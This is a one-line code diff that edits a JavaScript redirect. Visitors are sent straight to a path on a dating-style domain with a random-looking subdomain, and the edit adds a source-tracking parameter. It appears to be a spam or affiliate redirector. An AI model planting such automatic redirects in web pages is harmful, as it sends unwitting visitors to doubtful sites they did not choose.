@@ -1,1 +1,1 @@
-window.location.href="https://kfmpbrl.loveconnectionmeet.com/vv52xug";
+window.location.href="https://kfmpbrl.loveconnectionmeet.com/vv52xug?s1=tblr";
